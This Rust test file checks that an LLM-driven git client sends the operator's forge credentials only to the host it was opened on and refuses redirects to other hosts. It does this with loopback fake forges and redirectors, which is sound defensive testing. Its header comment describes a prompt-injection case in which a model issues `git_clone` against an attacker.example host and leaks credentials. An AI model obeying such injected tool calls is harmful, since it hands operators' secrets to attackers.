//! The git client's `username`/`password` go to the host it was opened on and nowhere else.
//!
//! libgit2 asks for credentials through a callback that names the URL being contacted, and
//! until September 2026 the callback ignored it. `git_clone`, `git_fetch` and `git_pull` are
//! open to the model (only pushes are gated), so a model answering a prompt-injected
//! `git_clone {"url": "https://attacker.example/x.git"}` met a 401 there and libgit2 posted
//! the operator's forge credentials to it.
//!
//! Two fake forges on loopback answer every request 401 with a Basic challenge and record
//! what they were sent. A client opened on the first, told to clone from the second, must
//! leave the second with no `Authorization` header at all; cloning from the first must
//! produce one, which is what shows the credentials still work where they belong. Zero LLM
//! calls: a zero-action rule answers every client event and the model URL is a closed port.
//!
//! libgit2 hands that callback the remote's *original* URL, so it cannot see a redirect: a
//! bound forge answering 302 to another host would have the other host's 401 answered with
//! the operator's credentials. The client therefore follows no redirect to another host.
//! A redirector on 127.0.0.1 points at a forge on `localhost` (another host as libgit2
//! compares them); with libgit2's default redirect policy the forge receives the
//! credentials, which is the control, and with the client's options it is never contacted.
//!
//! Run with:
//!   cargo test --no-default-features --features git --test client -- client::git::credential_scope

use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;
use std::time::Duration;

use netget::cli::management::ClientForm;
use netget::client::git::credentials::{
    push_options, remote_callbacks, remote_origin, CredentialScope,
};
use netget::state::app_state::AppState;
use netget::state::ClientId;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::sync::{mpsc, Mutex};

#[test]
fn a_remote_origin_is_scheme_host_and_a_non_default_port() {
    for (url, want) in [
        ("https://github.com/owner/repo.git", "https://github.com"),
        (
            "https://GitHub.com:443/owner/repo.git",
            "https://github.com",
        ),
        (
            "https://user:token@github.com/owner/repo.git",
            "https://github.com",
        ),
        ("http://127.0.0.1:8080/repo.git", "http://127.0.0.1:8080"),
        ("http://127.0.0.1:80/repo.git", "http://127.0.0.1"),
        ("git://example.com/repo.git", "git://example.com"),
        (
            "ssh://git@example.com:2222/repo.git",
            "ssh://example.com:2222",
        ),
        ("git@github.com:owner/repo.git", "ssh://github.com"),
        ("http://[::1]:8080/repo.git", "http://[::1]:8080"),
    ] {
        assert_eq!(remote_origin(url).as_deref(), Some(want), "{url}");
    }
    for local in [
        "/home/op/repo",
        "./repo",
        "../sibling",
        "file:///home/op/repo",
        "C:/repos/x",
        "",
    ] {
        assert_eq!(remote_origin(local), None, "{local:?} names no host");
    }
}

#[test]
fn a_scope_allows_its_own_origin_only() {
    let scope = CredentialScope::bind(
        Some("op"),
        Some("secret"),
        Some("https://github.com/owner/repo.git"),
    )
    .expect("bound");
    assert_eq!(scope.origin, "https://github.com");
    assert!(scope.allows("https://github.com/other/repo.git"));
    assert!(scope.allows("https://GITHUB.COM:443/x"));
    assert!(!scope.allows("https://attacker.example/x.git"));
    assert!(!scope.allows("https://github.com.attacker.example/x.git"));
    assert!(
        !scope.allows("http://github.com/owner/repo.git"),
        "scheme counts"
    );
    assert!(!scope.allows("https://github.com:8443/x"), "port counts");
    assert!(!scope.allows("/home/op/repo"));

    assert!(CredentialScope::bind(Some("op"), None, Some("https://x/")).is_none());
    assert!(CredentialScope::bind(None, Some("s"), Some("https://x/")).is_none());
    assert!(
        CredentialScope::bind(Some("op"), Some("s"), Some("/home/op/repo")).is_none(),
        "a local path binds nothing"
    );
    assert!(CredentialScope::bind(Some("op"), Some("s"), None).is_none());
}

/// A forge that challenges every request with Basic and records each request head.
async fn forge() -> (u16, Arc<Mutex<Vec<String>>>) {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    let seen = Arc::new(Mutex::new(Vec::new()));
    serve_forge(listener, seen.clone(), Arc::new(AtomicUsize::new(0)));
    (port, seen)
}

/// Accept on `listener` forever, counting accepts, recording each request head and
/// answering 401 with a Basic challenge.
fn serve_forge(
    listener: tokio::net::TcpListener,
    log: Arc<Mutex<Vec<String>>>,
    accepts: Arc<AtomicUsize>,
) {
    tokio::spawn(async move {
        while let Ok((mut stream, _)) = listener.accept().await {
            accepts.fetch_add(1, Ordering::SeqCst);
            let log = log.clone();
            tokio::spawn(async move {
                let head = read_head(&mut stream).await;
                log.lock().await.push(head);
                let _ = stream
                    .write_all(
                        b"HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Basic realm=\"forge\"\r\nContent-Length: 0\r\nConnection: close\r\n\r\n",
                    )
                    .await;
            });
        }
    });
}

async fn read_head(stream: &mut tokio::net::TcpStream) -> String {
    let mut head = Vec::new();
    let mut byte = [0u8; 1];
    while tokio::time::timeout(Duration::from_secs(5), stream.read_exact(&mut byte))
        .await
        .ok()
        .and_then(Result::ok)
        .is_some()
    {
        head.push(byte[0]);
        if head.ends_with(b"\r\n\r\n") {
            break;
        }
    }
    String::from_utf8_lossy(&head).into_owned()
}

/// A forge reached as `localhost`: 127.0.0.1 and, where it can be bound, ::1 on the same
/// port, so whichever address the resolver puts first is this forge.
struct LocalhostForge {
    port: u16,
    seen: Arc<Mutex<Vec<String>>>,
    accepts: Arc<AtomicUsize>,
}

async fn localhost_forge() -> LocalhostForge {
    let v4 = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = v4.local_addr().unwrap().port();
    let seen = Arc::new(Mutex::new(Vec::new()));
    let accepts = Arc::new(AtomicUsize::new(0));
    serve_forge(v4, seen.clone(), accepts.clone());
    if let Ok(v6) = tokio::net::TcpListener::bind(("::1", port)).await {
        serve_forge(v6, seen.clone(), accepts.clone());
    }
    LocalhostForge {
        port,
        seen,
        accepts,
    }
}

/// A server on 127.0.0.1 that answers every request with a 302 to the same request target
/// on `localhost:<target_port>`, counting its accepts.
async fn redirector(target_port: u16) -> (u16, Arc<AtomicUsize>) {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    let accepts = Arc::new(AtomicUsize::new(0));
    let counter = accepts.clone();
    tokio::spawn(async move {
        while let Ok((mut stream, _)) = listener.accept().await {
            counter.fetch_add(1, Ordering::SeqCst);
            tokio::spawn(async move {
                let head = read_head(&mut stream).await;
                let target = head.split(' ').nth(1).unwrap_or("/").to_string();
                let response = format!(
                    "HTTP/1.1 302 Found\r\nLocation: http://localhost:{target_port}{target}\r\n\
                     Content-Length: 0\r\nConnection: close\r\n\r\n"
                );
                let _ = stream.write_all(response.as_bytes()).await;
            });
        }
    });
    (port, accepts)
}

fn saw_authorization(heads: &[String]) -> bool {
    heads
        .iter()
        .any(|h| h.to_ascii_lowercase().contains("\r\nauthorization: basic "))
}

async fn new_state() -> AppState {
    let state = AppState::new_with_options(false, "http://127.0.0.1:1".to_string());
    state
        .set_llm_client(netget::llm::OllamaClient::new(
            "http://127.0.0.1:1".to_string(),
        ))
        .await;
    state
}

async fn wait_for_client_handle(state: &AppState, id: ClientId) {
    for _ in 0..1_000 {
        if state.has_client_handle(id).await {
            return;
        }
        tokio::time::sleep(Duration::from_millis(30)).await;
    }
    panic!(
        "git client #{} never registered a command handle",
        id.as_u32()
    );
}

#[tokio::test]
async fn credentials_are_offered_to_the_clients_own_forge_and_to_no_other_host() {
    let (home_port, home_seen) = forge().await;
    let (foreign_port, foreign_seen) = forge().await;
    let root = tempfile::tempdir().unwrap();
    let state = new_state().await;
    let (tx, _rx) = mpsc::unbounded_channel();
    let client_id = ClientForm {
        protocol: "git".to_string(),
        remote_addr: Some(format!("http://127.0.0.1:{home_port}/repo.git")),
        instruction: Some("test client".to_string()),
        event_handlers: Some(vec![serde_json::json!({
            "event_pattern": "*",
            "handler": { "type": "static", "actions": [] }
        })]),
        startup_params: Some(serde_json::json!({
            "username": "operator",
            "password": "forge-token",
            "allowed_root": root.path().to_string_lossy(),
        })),
        ..Default::default()
    }
    .create(
        &state,
        netget::llm::OllamaClient::new("http://127.0.0.1:1".to_string()),
        tx,
    )
    .await
    .expect("create git client");
    wait_for_client_handle(&state, client_id).await;

    // The injected clone of a foreign forge: whatever the outcome reads, the forge must
    // have been sent no credential.
    let outcome = state
        .send_to_client(
            client_id,
            serde_json::json!({
                "type": "git_clone",
                "url": format!("http://127.0.0.1:{foreign_port}/loot.git"),
                "path": "foreign"
            }),
            Duration::from_secs(30),
        )
        .await;
    let foreign = foreign_seen.lock().await.clone();
    assert!(
        !foreign.is_empty(),
        "the foreign forge was never contacted, so the test proved nothing: {outcome:?}"
    );
    assert!(
        !saw_authorization(&foreign),
        "the operator's credentials reached the foreign forge: {foreign:?}"
    );
    let text = format!("{outcome:?}");
    assert!(
        text.contains("bound to") || text.contains("not offered"),
        "the refusal should say why: {text}"
    );

    // The same credentials still go to the forge the client was opened on.
    let _ = state
        .send_to_client(
            client_id,
            serde_json::json!({
                "type": "git_clone",
                "url": format!("http://127.0.0.1:{home_port}/repo.git"),
                "path": "home"
            }),
            Duration::from_secs(30),
        )
        .await;
    let home = home_seen.lock().await.clone();
    assert!(
        saw_authorization(&home),
        "the home forge's 401 should have been answered with Basic credentials: {home:?}"
    );
}

#[tokio::test]
async fn a_redirect_to_another_host_is_refused_before_it_is_contacted() {
    // Control: libgit2's default policy follows the redirect on the first request, and the
    // scope check passes on the original URL, so the other host's 401 is answered with the
    // operator's credentials. Without this the zero below could mean a redirector nobody
    // followed for some other reason.
    let control_forge = localhost_forge().await;
    let (control_port, control_hits) = redirector(control_forge.port).await;
    let control_url = format!("http://127.0.0.1:{control_port}/repo.git");
    let scope = CredentialScope::bind(Some("operator"), Some("forge-token"), Some(&control_url))
        .expect("bound");
    let dir = tempfile::tempdir().unwrap();
    let (control_scope, url, into) = (scope, control_url.clone(), dir.path().join("control"));
    let control = tokio::task::spawn_blocking(move || {
        let mut options = git2::FetchOptions::new();
        options.remote_callbacks(remote_callbacks(Some(&control_scope)));
        options.follow_redirects(git2::RemoteRedirect::Initial);
        let mut builder = git2::build::RepoBuilder::new();
        builder.fetch_options(options);
        builder.clone(&url, &into).map(|_| ())
    })
    .await
    .unwrap();
    assert!(control.is_err(), "the control clone cannot succeed");
    assert!(
        control_hits.load(Ordering::SeqCst) > 0,
        "control: redirector unused"
    );
    let leaked = control_forge.seen.lock().await.clone();
    assert!(
        saw_authorization(&leaked),
        "control: libgit2's default should have followed the redirect and offered the \
         credentials there, or this test proves nothing: {control:?} {leaked:?}"
    );

    // The client: same shape, its own options.
    let forge = localhost_forge().await;
    let (redirect_port, redirect_hits) = redirector(forge.port).await;
    let home = format!("http://127.0.0.1:{redirect_port}/repo.git");
    let root = tempfile::tempdir().unwrap();
    let state = new_state().await;
    let (tx, _rx) = mpsc::unbounded_channel();
    let client_id = ClientForm {
        protocol: "git".to_string(),
        remote_addr: Some(home.clone()),
        instruction: Some("test client".to_string()),
        event_handlers: Some(vec![serde_json::json!({
            "event_pattern": "*",
            "handler": { "type": "static", "actions": [] }
        })]),
        startup_params: Some(serde_json::json!({
            "username": "operator",
            "password": "forge-token",
            "allowed_root": root.path().to_string_lossy(),
        })),
        ..Default::default()
    }
    .create(
        &state,
        netget::llm::OllamaClient::new("http://127.0.0.1:1".to_string()),
        tx,
    )
    .await
    .expect("create git client");
    wait_for_client_handle(&state, client_id).await;

    let outcome = state
        .send_to_client(
            client_id,
            serde_json::json!({ "type": "git_clone", "url": home, "path": "redirected" }),
            Duration::from_secs(30),
        )
        .await;
    assert!(
        redirect_hits.load(Ordering::SeqCst) > 0,
        "the client never contacted its own forge: {outcome:?}"
    );
    let text = format!("{outcome:?}");
    assert!(
        text.contains("redirect"),
        "the clone should fail on the refused redirect: {text}"
    );

    // Push options, driven directly: pushes are gated behind `allow_remote_writes` in the
    // client, and the options are the part that decides.
    let push_forge = localhost_forge().await;
    let (push_port, push_hits) = redirector(push_forge.port).await;
    let push_url = format!("http://127.0.0.1:{push_port}/repo.git");
    let push_scope = CredentialScope::bind(Some("operator"), Some("forge-token"), Some(&push_url))
        .expect("bound");
    let repo_dir = tempfile::tempdir().unwrap();
    let repo_path = repo_dir.path().to_path_buf();
    let pushed = tokio::task::spawn_blocking(move || -> Result<(), git2::Error> {
        let repo = git2::Repository::init(&repo_path)?;
        let signature = git2::Signature::now("operator", "operator@example.test")?;
        {
            let tree_id = repo.index()?.write_tree()?;
            let tree = repo.find_tree(tree_id)?;
            repo.commit(Some("HEAD"), &signature, &signature, "init", &tree, &[])?;
        }
        let head = repo
            .head()?
            .name()
            .expect("HEAD names a branch")
            .to_string();
        let mut remote = repo.remote("origin", &push_url)?;
        let mut options = push_options(Some(&push_scope));
        remote.push(&[format!("{head}:{head}").as_str()], Some(&mut options))
    })
    .await
    .unwrap();
    let push_error = pushed.expect_err("a push through a refused redirect cannot succeed");
    assert!(
        push_hits.load(Ordering::SeqCst) > 0,
        "push: redirector unused"
    );
    assert!(
        push_error.message().contains("redirect"),
        "the push should fail on the refused redirect: {push_error}"
    );

    tokio::time::sleep(Duration::from_millis(200)).await;
    assert_eq!(
        forge.accepts.load(Ordering::SeqCst),
        0,
        "the clone followed the redirect to another host: {:?}",
        forge.seen.lock().await
    );
    assert_eq!(
        push_forge.accepts.load(Ordering::SeqCst),
        0,
        "the push followed the redirect to another host: {:?}",
        push_forge.seen.lock().await
    );
}
